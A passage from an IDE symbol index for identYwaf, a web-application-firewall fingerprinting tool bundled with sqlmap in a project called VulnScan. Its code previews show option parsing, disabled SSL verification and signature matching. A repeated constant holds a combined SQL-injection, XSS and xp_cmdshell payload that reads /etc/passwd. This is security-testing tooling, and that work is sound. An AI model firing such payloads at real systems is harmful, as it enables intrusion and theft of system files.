        "peekOfCode": "def single_print(message):\n    if message not in seen:\n        print(message)\n        seen.add(message)\ndef check_payload(payload, protection_regex=GENERIC_PROTECTION_REGEX % '|'.join(GENERIC_PROTECTION_KEYWORDS)):\n    global chained\n    global heuristic\n    global intrusive\n    global locked_code\n    global locked_regex",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "check_payload",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def check_payload(payload, protection_regex=GENERIC_PROTECTION_REGEX % '|'.join(GENERIC_PROTECTION_KEYWORDS)):\n    global chained\n    global heuristic\n    global intrusive\n    global locked_code\n    global locked_regex\n    time.sleep(options.delay or 0)\n    if options.post:\n        _ = \"%s=%s\" % (\"\".join(random.sample(string.ascii_letters, 3)), quote(payload))\n        intrusive = retrieve(options.url, _)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "colorize",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def colorize(message):\n    if COLORIZE:\n        message = re.sub(r\"\\[(.)\\]\", lambda match: \"[%s%s\\033[00;49m]\" % (LEVEL_COLORS[match.group(1)], match.group(1)), message)\n        if any(_ in message for _ in (\"rejected summary\", \"challenge detected\")):\n            for match in re.finditer(r\"[^\\w]'([^)]+)'\" if \"rejected summary\" in message else r\"\\('(.+)'\\)\", message):\n                message = message.replace(\"'%s'\" % match.group(1), \"'\\033[37m%s\\033[00;49m'\" % match.group(1), 1)\n        else:\n            for match in re.finditer(r\"[^\\w]'([^']+)'\", message):\n                message = message.replace(\"'%s'\" % match.group(1), \"'\\033[37m%s\\033[00;49m'\" % match.group(1), 1)\n        if \"blind match\" in message:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "parse_args",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def parse_args():\n    global options\n    parser = optparse.OptionParser(version=VERSION)\n    parser.add_option(\"--delay\", dest=\"delay\", type=int, help=\"Delay (sec) between tests (default: 0)\")\n    parser.add_option(\"--timeout\", dest=\"timeout\", type=int, help=\"Response timeout (sec) (default: 10)\")\n    parser.add_option(\"--proxy\", dest=\"proxy\", help=\"HTTP proxy address (e.g. \\\"http://127.0.0.1:8080\\\")\")\n    parser.add_option(\"--proxy-file\", dest=\"proxy_file\", help=\"Load (rotating) HTTP(s) proxy list from a file\")\n    parser.add_option(\"--random-agent\", dest=\"random_agent\", action=\"store_true\", help=\"Use random HTTP User-Agent header value\")\n    parser.add_option(\"--code\", dest=\"code\", type=int, help=\"Expected HTTP code in rejected responses\")\n    parser.add_option(\"--string\", dest=\"string\", help=\"Expected string in rejected responses\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "load_data",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def load_data():\n    global WAF_RECOGNITION_REGEX\n    if os.path.isfile(DATA_JSON_FILE):\n        with codecs.open(DATA_JSON_FILE, \"rb\", encoding=\"utf8\") as f:\n            DATA_JSON.update(json.load(f))\n        WAF_RECOGNITION_REGEX = \"\"\n        for waf in DATA_JSON[\"wafs\"]:\n            if DATA_JSON[\"wafs\"][waf][\"regex\"]:\n                WAF_RECOGNITION_REGEX += \"%s|\" % (\"(?P<waf_%s>%s)\" % (waf, DATA_JSON[\"wafs\"][waf][\"regex\"]))\n            for signature in DATA_JSON[\"wafs\"][waf][\"signatures\"]:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "init",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def init():\n    os.chdir(os.path.abspath(os.path.dirname(__file__)))\n    # Reference: http://blog.mathieu-leplatre.info/python-utf-8-print-fails-when-redirecting-stdout.html\n    if not PY3 and not IS_TTY:\n        sys.stdout = codecs.getwriter(locale.getpreferredencoding())(sys.stdout)\n    print(colorize(\"[o] initializing handlers...\"))\n    # Reference: https://stackoverflow.com/a/28052583\n    if hasattr(ssl, \"_create_unverified_context\"):\n        ssl._create_default_https_context = ssl._create_unverified_context\n    if options.proxy_file:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "format_name",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def format_name(waf):\n    return \"%s%s\" % (DATA_JSON[\"wafs\"][waf][\"name\"], (\" (%s)\" % DATA_JSON[\"wafs\"][waf][\"company\"]) if DATA_JSON[\"wafs\"][waf][\"name\"] != DATA_JSON[\"wafs\"][waf][\"company\"] else \"\")\ndef non_blind_check(raw, silent=False):\n    retval = False\n    match = re.search(WAF_RECOGNITION_REGEX, raw or \"\")\n    if match:\n        retval = True\n        for _ in match.groupdict():\n            if match.group(_):\n                waf = re.sub(r\"\\Awaf_\", \"\", _)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "non_blind_check",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def non_blind_check(raw, silent=False):\n    retval = False\n    match = re.search(WAF_RECOGNITION_REGEX, raw or \"\")\n    if match:\n        retval = True\n        for _ in match.groupdict():\n            if match.group(_):\n                waf = re.sub(r\"\\Awaf_\", \"\", _)\n                non_blind.add(waf)\n                if not silent:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "run",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def run():\n    global original\n    hostname = options.url.split(\"//\")[-1].split('/')[0].split(':')[0]\n    if not hostname.replace('.', \"\").isdigit():\n        print(colorize(\"[i] checking hostname '%s'...\" % hostname))\n        try:\n            socket.getaddrinfo(hostname, None)\n        except socket.gaierror:\n            exit(colorize(\"[x] host '%s' does not exist\" % hostname))\n    results = \"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def main():\n    if \"--version\" not in sys.argv:\n        print(BANNER)\n    parse_args()\n    init()\n    run()\nload_data()\nif __name__ == \"__main__\":\n    try:\n        main()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "PY3",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "PY3 = sys.version_info >= (3, 0)\nif PY3:\n    import http.cookiejar\n    import http.client as httplib\n    import urllib.request\n    build_opener = urllib.request.build_opener\n    install_opener = urllib.request.install_opener\n    quote = urllib.parse.quote\n    urlopen = urllib.request.urlopen\n    CookieJar = http.cookiejar.CookieJar",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "NAME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "NAME = \"identYwaf\"\nVERSION = \"1.0.131\"\nBANNER = r\"\"\"\n                                   ` __ __ `\n ____  ___      ___  ____   ______ `|  T  T` __    __   ____  _____ \nl    j|   \\    /  _]|    \\ |      T`|  |  |`|  T__T  T /    T|   __|\n |  T |    \\  /  [_ |  _  Yl_j  l_j`|  ~  |`|  |  |  |Y  o  ||  l_\n |  | |  D  YY    _]|  |  |  |  |  `|___  |`|  |  |  ||     ||   _|\n j  l |     ||   [_ |  |  |  |  |  `|     !` \\      / |  |  ||  ] \n|____jl_____jl_____jl__j__j  l__j  `l____/ `  \\_/\\_/  l__j__jl__j  (%s)%s\"\"\".strip(\"\\n\") % (VERSION, \"\\n\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "VERSION = \"1.0.131\"\nBANNER = r\"\"\"\n                                   ` __ __ `\n ____  ___      ___  ____   ______ `|  T  T` __    __   ____  _____ \nl    j|   \\    /  _]|    \\ |      T`|  |  |`|  T__T  T /    T|   __|\n |  T |    \\  /  [_ |  _  Yl_j  l_j`|  ~  |`|  |  |  |Y  o  ||  l_\n |  | |  D  YY    _]|  |  |  |  |  `|___  |`|  |  |  ||     ||   _|\n j  l |     ||   [_ |  |  |  |  |  `|     !` \\      / |  |  ||  ] \n|____jl_____jl_____jl__j__j  l__j  `l____/ `  \\_/\\_/  l__j__jl__j  (%s)%s\"\"\".strip(\"\\n\") % (VERSION, \"\\n\")\nRAW, TEXT, HTTPCODE, SERVER, TITLE, HTML, URL = xrange(7)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "BANNER = r\"\"\"\n                                   ` __ __ `\n ____  ___      ___  ____   ______ `|  T  T` __    __   ____  _____ \nl    j|   \\    /  _]|    \\ |      T`|  |  |`|  T__T  T /    T|   __|\n |  T |    \\  /  [_ |  _  Yl_j  l_j`|  ~  |`|  |  |  |Y  o  ||  l_\n |  | |  D  YY    _]|  |  |  |  |  `|___  |`|  |  |  ||     ||   _|\n j  l |     ||   [_ |  |  |  |  |  `|     !` \\      / |  |  ||  ] \n|____jl_____jl_____jl__j__j  l__j  `l____/ `  \\_/\\_/  l__j__jl__j  (%s)%s\"\"\".strip(\"\\n\") % (VERSION, \"\\n\")\nRAW, TEXT, HTTPCODE, SERVER, TITLE, HTML, URL = xrange(7)\nCOOKIE, UA, REFERER = \"Cookie\", \"User-Agent\", \"Referer\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "GENERIC_PROTECTION_KEYWORDS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "GENERIC_PROTECTION_KEYWORDS = (\"rejected\", \"forbidden\", \"suspicious\", \"malicious\", \"captcha\", \"invalid\", \"your ip\", \"please contact\", \"terminated\", \"protected\", \"unauthorized\", \"blocked\", \"protection\", \"incident\", \"denied\", \"detected\", \"dangerous\", \"firewall\", \"fw_block\", \"unusual activity\", \"bad request\", \"request id\", \"injection\", \"permission\", \"not acceptable\", \"security policy\", \"security reasons\")\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(%s)\\b\"\nGENERIC_ERROR_MESSAGE_REGEX = r\"\\b[A-Z][\\w, '-]*(protected by|security|unauthorized|detected|attack|error|rejected|allowed|suspicious|automated|blocked|invalid|denied|permission)[\\w, '!-]*\"\nWAF_RECOGNITION_REGEX = None\nHEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "GENERIC_PROTECTION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "GENERIC_PROTECTION_REGEX = r\"(?i)\\b(%s)\\b\"\nGENERIC_ERROR_MESSAGE_REGEX = r\"\\b[A-Z][\\w, '-]*(protected by|security|unauthorized|detected|attack|error|rejected|allowed|suspicious|automated|blocked|invalid|denied|permission)[\\w, '!-]*\"\nWAF_RECOGNITION_REGEX = None\nHEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "GENERIC_ERROR_MESSAGE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "GENERIC_ERROR_MESSAGE_REGEX = r\"\\b[A-Z][\\w, '-]*(protected by|security|unauthorized|detected|attack|error|rejected|allowed|suspicious|automated|blocked|invalid|denied|permission)[\\w, '!-]*\"\nWAF_RECOGNITION_REGEX = None\nHEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "WAF_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "WAF_RECOGNITION_REGEX = None\nHEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_PAYLOAD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "HEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "PAYLOADS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "PAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "SIGNATURES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "SIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "DATA_JSON",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "DATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "DATA_JSON_FILE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "DATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "MAX_HELP_OPTION_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "MAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "IS_TTY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "IS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "IS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "COLORIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "COLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "LEVEL_COLORS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "LEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "VERIFY_OK_INTERVAL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "VERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\nif COLORIZE:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "VERIFY_RETRY_TIMES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
